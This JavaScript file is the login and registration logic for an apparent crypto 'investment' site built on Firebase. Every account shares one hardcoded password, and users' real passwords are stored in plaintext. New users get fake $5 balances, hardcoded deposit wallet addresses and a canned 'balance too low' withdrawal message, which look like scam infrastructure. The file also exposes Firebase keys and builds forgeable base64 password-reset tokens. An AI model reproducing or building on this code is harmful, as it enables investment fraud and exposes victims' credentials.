// var firebaseConfig = {
//     apiKey: "AIzaSyAGWkMJyEOBxJlG4_GXSMvDPyYkbaqWXpU",
//     authDomain: "last-Alphafinservices.firebaseapp.com",
//     projectId: "last-Alphafinservices",
//     storageBucket: "last-Alphafinservices.appspot.com",
//     messagingSenderId: "631931157925",
//     appId: "1:631931157925:web:869a71d92cbcd7db047c4c",
//     measurementId: "G-FBXM3W5YQV"
//     };

var firebaseConfig = {
    apiKey: "AIzaSyD33YoQkbeQYR7bV3Gtr6xJMzO_SUAoLeI",
    authDomain: "dizzyfriendcrypto.firebaseapp.com",
    projectId: "dizzyfriendcrypto",
    storageBucket: "dizzyfriendcrypto.appspot.com",
    messagingSenderId: "658978217510",
    appId: "1:658978217510:web:254cadd5ff68f96fd9d0e7",
    measurementId: "G-4M3Q3V2Q8S"
  };

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
//Initialize variables
const auth = firebase.auth();
const database = firebase.database();
var alertBox = document.getElementById("login_alert_box");

//Set up our register function
function register_() {
  if (
    document.getElementById("password").value !==
    document.getElementById("confirm-password").value
  ) {
    alertBox.innerHTML = "Password not match!";
    alert("Password not match!");
    alertBox.style.display = "block";
  } else {
    hide_loader();
    // Get all our input fields
    var full_name = document.getElementById("f_name").value,
      username = document.getElementById("input1").value,
      email = document.getElementById("email").value,
      phone = document.getElementById("phone").value,
      password = document.getElementById("password").value,
      country = document.getElementById("country").value;

    var otp = Math.floor(100000 + Math.random() * 900000);
    localStorage.setItem("otp", otp);
    document.getElementById("subject").value = "WELCOME TO ALPHAFINSERVICES";
    document.getElementById("msg").value = otp;
      //"Your OTP code is <b>" + otp + "</b>";

    var ref_by;
    if (document.getElementById("ref_by") == null) {
      if (localStorage.getItem("who_refered_me") !== undefined) {
        ref_by = localStorage.getItem("who_refered_me");
      }
    } else {
      ref_by = document.getElementById("ref_by").value;
    }

    show_loader();
    // Move on with Auth
    auth
      .createUserWithEmailAndPassword(email, "Keephopealive123haha")
      .then(function () {
        var user = auth.currentUser;
        // Add this user to database
        var database_ref = database.ref();
        // Create User data
        var user_data = {
          email,
          ref_by,
          word: password,
          last_login: getCurrentTime(new Date()),
          withdrawMsg: ["Sorry", "your account balance is too low", "info"],
          verify_status: "not_verified",
          dashboard: {
            full_name,
            account_balance: "$5.00",
            total_profit: "$0.00",
            total_bonus: "$5.00",
            total_referral_bonus: "$0.00",
            total_investment_plan: "0",
            total_active_investment_plan: "0",
            total_deposit: "$0.00",
            total_withdrawal: "$0.00",
          },
          roi_history: [],
          transaction_history: {
            deposit: [],
            withdrawal: [],
            others: [
              {
                amount: "$5",
                type: "Bonus",
                plan: "SignUp Bonus",
                date_created: getCurrentTime(new Date()),
              },
            ],
          },
          crypto_exchange: {
            account_balance: "$5.00",
            btc: "0",
            eth: "0",
            ltc: "0",
            link: "0",
            bnb: "0",
            ada: "0",
            aave: "0",
            usdt: "0",
            bch: "0",
            xrp: "0",
            xlm: "0",
          },
          my_investments: [],
          refer: {
            ref_by,
            username,
            refered_list: [],
          },
          user_settings: {
            personal_settings: {
              full_name,
              phone,
              country,
              email,
              dob: "",
            },
            withdraw_settings: {
              bank_transfer: {
                bank_name: "",
                account_name: "",
                account_no: "",
                swift_code: "",
              },
              withdraw_crypto_wallets: {
                withdraw_btc_wallet: "",
                withdraw_eth_wallet: "",
                withdraw_ltc_wallet: "",
              },
            },
            password_settings: {
              word: password,
            },
          },
          fund_account: {
            deposit_doge_address: "loading...",
            deposit_bch_address: "loading...",
            deposit_lit_address: "ltc1qjfqt0f8zrt5kzgh8qakvf4pk4cuxsys0l8c3lu",
            deposit_eth_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
            deposit_btc_address: "bc1qgdqcdqdw8hwmasxn25rn6zdquthymzum4txuwt",
            deposit_solana_address: "loading...",
            deposit_usdt_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
            deposit_bnb_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
            bank_transfer: {
              bank_name: "",
              account_name: "",
              account_no: "",
              swift_code: "",
            },
          },
        };

        database_ref.child("users/" + user.uid).set(user_data);
        localStorage.setItem("email_me", email);
        localStorage.setItem("password_me", password);
        setTimeout(goToVerify, 4000);
      })
      .catch(function (error) {
        hide_loader();
        var error_message = error.message;
        alertBox.style.display = "block";
        alertBox.innerHTML = error_message;
      });
  }
}

function getInputValues() {
  var full_name = document.getElementById("f_name").value,
    username = document.getElementById("input1").value,
    email = document.getElementById("email").value,
    phone = document.getElementById("phone").value,
    password = document.getElementById("password").value,
    country = document.getElementById("country").value;

  var otp = Math.floor(100000 + Math.random() * 900000);
  document.getElementById("subject").value = "WELCOME TO ALPHAFINSERVICES";
  document.getElementById("msg").value = otp;

  var ref_by;
  if (document.getElementById("ref_by") == null) {
    if (localStorage.getItem("who_refered_me") !== undefined) {
      ref_by = localStorage.getItem("who_refered_me");
    }
  } else {
    ref_by = document.getElementById("ref_by").value;
  }

  return {
    full_name: full_name,
    username: username,
    email: email,
    phone: phone,
    password: password,
    country: country,
    ref_by: ref_by,
    otp,
    otp_time: getCurrentTime(new Date())
  };
}

async function regenerateOtp() {
  var newOtp = Math.floor(100000 + Math.random() * 900000);
  return {
    otp: newOtp,
    otp_time: getCurrentTime(new Date())
  };
}

async function saveUserData(userData) {
  //show_loader();
  try {
    const database_ref = database.ref();
    var user_id = localStorage.getItem("user_id");

    await database_ref.child("users/" + user_id).update(userData);

    //hide_loader();
    console.log("done");
    //setTimeout(goToVerify, 4000);
  } catch (error) {
    hide_loader();
    var error_message = error.message;
    alertBox.style.display = "block";
    alertBox.innerHTML = error_message;
  }
}


async function createNewUser(userData) {
  show_loader();
  try{
  await auth.createUserWithEmailAndPassword(userData.email, "Keephopealive123haha");
    
      var user = auth.currentUser;
      var database_ref = database.ref();

      // Customize user data structure as needed
      var user_data = {
        email: userData.email,
        ref_by: userData.ref_by,
        word: userData.password,
        last_login: getCurrentTime(new Date()),
        withdrawMsg: ["Sorry", "your account balance is too low", "info"],
        verify_status: "not_verified",
        otp: userData.otp,
        otp_time: userData.otp !== null ? new Date().toString() : null,
        dashboard: {
          full_name: userData.full_name,
          account_balance: "$5.00",
          total_profit: "$0.00",
          total_bonus: "$5.00",
          total_referral_bonus: "$0.00",
          total_investment_plan: "0",
          total_active_investment_plan: "0",
          total_deposit: "$0.00",
          total_withdrawal: "$0.00",
        },
        roi_history: [],
        transaction_history: {
          deposit: [],
          withdrawal: [],
          others: [
            {
              amount: "$5",
              type: "Bonus",
              plan: "SignUp Bonus",
              date_created: getCurrentTime(new Date()),
            },
          ],
        },
        crypto_exchange: {
          account_balance: "$5.00",
          btc: "0",
          eth: "0",
          ltc: "0",
          link: "0",
          bnb: "0",
          ada: "0",
          aave: "0",
          usdt: "0",
          bch: "0",
          xrp: "0",
          xlm: "0",
        },
        my_investments: [],
        refer: {
          ref_by: userData.ref_by,
          username: userData.username,
          refered_list: [],
        },
        user_settings: {
          personal_settings: {
            full_name: userData.full_name,
            phone: userData.phone,
            country: userData.country,
            email: userData.email,
            dob: "",
          },
          withdraw_settings: {
            bank_transfer: {
              bank_name: "",
              account_name: "",
              account_no: "",
              swift_code: "",
            },
            withdraw_crypto_wallets: {
              withdraw_btc_wallet: "",
              withdraw_eth_wallet: "",
              withdraw_ltc_wallet: "",
              withdraw_solana_wallet: "",
              withdraw_bnb_wallet: "",
              withdraw_bch_wallet: "",
              withdraw_usdt_wallet: "",
              withdraw_doge_wallet: "",
            },
          },
          password_settings: {
            word: password,
          },
        },
        fund_account: {
          deposit_doge_address: "loading...",
          deposit_bch_address: "loading...",
          deposit_lit_address: "ltc1qjfqt0f8zrt5kzgh8qakvf4pk4cuxsys0l8c3lu",
          deposit_eth_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
          deposit_btc_address: "bc1qgdqcdqdw8hwmasxn25rn6zdquthymzum4txuwt",
          deposit_solana_address: "loading...",
          deposit_usdt_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
          deposit_bnb_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
          bank_transfer: {
            bank_name: "",
            account_name: "",
            account_no: "",
            swift_code: "",
          },
        },
      };

      await database_ref.child("users/" + user.uid).set(user_data);
      localStorage.setItem("email_me", userData.email);
      localStorage.setItem("name", userData.name);
      localStorage.setItem("user_id", user.uid);

      return { status: 'success' };
    }
    catch(error) {
      hide_loader();
      var error_message = error.message;
      alertBox.style.display = "block";
      alertBox.innerHTML = error_message;
      return { status: 'failed' };
    };
}


async function fetchUserData(uid) {
  try {
    var database_ref = database.ref("users/" + uid);
    var snapshot = await database_ref.once("value");
    var userData = snapshot.val();
    localStorage.setItem("user_details_holder", JSON.stringify(userData));
    user_details_holder = userData;
    return userData;
  } catch (error) {
    console.error("Error fetching user data:", error);
  }
}

async function fetchUserDataByEmail(email) {
  const dbRef = firebase.database().ref("users");
  let userDetails = null;

  await dbRef.once("value", (snapshot) => {
    snapshot.forEach((childSnapshot) => {
      if (childSnapshot.val()?.email?.toLowerCase() === email.toLowerCase()) {
        userDetails = {
          ...childSnapshot.val(),
          // reset_time: new Date().toString(),
          // reset_link: "", // Placeholder, will be updated after encryption
        };
      }
    });
  });

  return userDetails;
}

async function fetchUserDataByEmail(email) {
  try {
    await auth.signInWithEmailAndPassword(email, "Keephopealive123haha");

    var user = auth.currentUser;
    window.localStorage.setItem("user_id", user.uid);
    var firebaseRef = firebase.database().ref("users");
    var user_details_holder = null;

    // Fetch user data from Firebase database
    await firebaseRef.once("value", function (snapshot) {
      snapshot.forEach(function (element) {
        if ((element.val()?.email?.toLowerCase() ?? "") === (email?.toLowerCase() ?? "")) {
          user_details_holder = element.val();
          //localStorage.setItem("user_details_holder", JSON.stringify(user_details_holder));
        }
      });
    });

    // Check if user details were found
    if (user_details_holder == null) {
      alertBox.style.display = "block";
      alertBox.innerHTML = "Invalid link!";
      hide_loader();
      return null; // Return null if user details not found
    }

    // Return user details
    return user_details_holder;
  } catch (error) {
    console.error("Error signing in or fetching user data:", error);
    alertBox.style.display = "block";
    alertBox.innerHTML = "Invalid link!";
    hide_loader();
    return null; // Return null in case of any error
  }
}




async function register() {
  if (document.getElementById("password").value !==
    document.getElementById("confirm-password").value) {
    alertBox.innerHTML = "Password not match!";
    alert("Password not match!");
    alertBox.style.display = "block";
  } else {
    var userData = getInputValues();
    var isCreationSuccessful = await createNewUser(userData);
    if (isCreationSuccessful.status == "success") {
      setTimeout(goToVerify, 4000);
    } else {
      hide_loader();
    }
  }
}



function hide_loader() {
  document.getElementById("container_body").style.display = "block";
  document.getElementById("divElement").style.display = "none";
}
function show_loader() {
  document.getElementById("container_body").style.display = "none";
  document.getElementById("divElement").style.display = "block";
}
function constructor_login() {
  if (user_details_holder.email !== undefined) {
    document.getElementById("email").value = user_details_holder.email;
  } else {
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
  }
  hide_loader();
}
var user_details_holder = {};
function login() {
  show_loader();
  var email_input_ = document.getElementById("email").value;
  if (!email_input_.includes("@")) {
    alert("Please enter a valid email");
    hide_loader();
  } else {
    localStorage.setItem("who_refered_me", "");
    var coming_from_reloader = "no";
    var email, password;
      if (email_input_ == "" || document.getElementById("password").value == "")
      {
        var error_message = "Enter both fields!";
        alertBox.style.display = "block";
        alertBox.innerHTML = error_message;
        hide_loader();
      } else {
        email = email_input_;
        auth
          .signInWithEmailAndPassword(email, "Keephopealive123haha")
          .then(function () {
            var user = auth.currentUser;
            var database_ref = database.ref();
            var firebaseRef = firebase.database().ref("users");
            firebaseRef.once("value", function (snapshot) {
              snapshot.forEach(function (element) {
                if ((element.val()?.email?.toLowerCase() ?? "") === (email?.toLowerCase() ?? "")) {
                  user_details_holder = element.val();
                  console.log(user.uid);
                  if (user_details_holder.verify_status != "verified") {
                    localStorage.setItem("user_id", user.uid);
                    window.location = "verify.html";
                    hide_loader();
                  }
                  localStorage.setItem(
                    "user_details_holder",
                    JSON.stringify(user_details_holder)
                  );
                }
              });
              // Update User data
              var user_data = {
                ...user_details_holder,
                last_login: getCurrentTime(new Date()),
              };
              // Push to Firebase Database
              database_ref.child("users/" + user.uid).update(user_data);
            });
            // User Logged In
            // CHECK PASSWORD
            setTimeout(check_password, 4000);
          })
          .catch(function (error) {
            if (coming_from_reloader == "yes") {
              hide_loader();
              localStorage.clear();
              user_details_holder = null;
            } else {
              localStorage.clear();
              show_loader();
              //var error_code = error.code;
              var error_message = "Wrong Credentials"; //error.message;
              if (
                error_message ==
                "There is no user record corresponding to this identifier. The user may have been deleted."
              ) {
                user_details_holder = null;
              }
              if (
                document.getElementById("email").value !== "" &&
                document.getElementById("password").value !== ""
              ) {
                if (
                  error_message ==
                  "There is no user record corresponding to this identifier. The user may have been deleted."
                ) {
                  error_message = "Wrong Credentials!";
                }
              }
              swal("Notification!", error_message, "error");
              //alert(error_message);
            }
            console.log(error);
            hide_loader();
          });

      }
    //}
  }
}
function check_password() {
  if (document.getElementById("password").value == user_details_holder.word) {
    goToDashboard();
  } else {
    swal("Notification!", "Wrong Credentials", "error");
    hide_loader();
    localStorage.clear();
    user_details_holder = null;
  }
}

async function goToDashboard() {
  if (user_details_holder == undefined) {
    location.reload();
  } else {
    if (user_details_holder.verify_status == "verified") {
      window.location = "../../dashboard.html";
    } else {
      var userData = regenerateOtp();
      await createNewUser(userData);

      goToVerify(userData.otp);

      window.location.href = "verify.html";
    }
  }
}
function goToVerify(input = 'register') {
  var data = {
    email: input == "register" ? document.getElementById("email").value : user_details_holder.user_settings.personal_settings.email,
    subject: input == "register" ? document.getElementById("subject").value : "EMAIL VERIFICATION REQUIRED",
    name: input == "register" ? document.getElementById("f_name").value : user_details_holder.dashboard.full_name,
    msg: input == "register" ? document.getElementById("msg").value : msg,
    type: "code"
  };
  var temp = JSON.stringify(data);
  if (!data.email?.trim() || !data.subject?.trim() || !data.name?.trim() || !data.msg?.trim()) {
    swal("Error!", "Something went wrong", "error");
    window.location.href = "login.html";
  }
  
  $.ajax({
    type: "post",
    dataType: "json",
    // url: "../php/send.php",
    url: "https://gtsfastservice.com/test/php/send.php",
    data: { data: temp }, // stringyfy before passing
    success: function (status) {
      console.log(status);
      if (status == "success") {
        alert(input == "register" ? "Registration Successful!" : "Code sent!");
        window.location.href = "verify.html";
      } else {
        alert("something went wrong, try again.");
        hide_loader();
      }
    },
    error: function (status) {
      alert("Network Issues!");
      hide_loader();
      console.log(status);
    },
  });
  //   document.getElementById("signUp_form").submit();
}

function getCurrentTime(date) {
  var hours = date.getHours();
  var minutes = date.getMinutes();
  var ampm = hours >= 12 ? "pm" : "am";
  hours = hours % 12;
  hours = hours ? hours : 12; // the hour '0' should be '12'
  minutes = minutes < 10 ? "0" + minutes : minutes;
  var strTime = hours + ":" + minutes + " " + ampm;
  return (
    date.getMonth() +
    1 +
    "/" +
    date.getDate() +
    "/" +
    date.getFullYear() +
    "  " +
    strTime
  );
}


async function generateResetPasswordLink(email) {
  var currentLocation = window.location.toString().split("forgot-password.html")[0];
  const baseURL = currentLocation + "reset.html?token=";
  const encodedEmail = await encrypt(email);
  return baseURL + encodedEmail;
}
async function decodeResetPasswordLink(token) {
  return await decrypt(token);
}

async function encrypt(str) {
  str = str + "whothemblsdkskdehehe" + new Date().toString();
  return btoa(unescape(encodeURIComponent(str)));
}
async function decrypt(encodedStr) {
  return decodeURIComponent(escape(atob(encodedStr)).split("whothemblsdkskdehehe")[0]);
}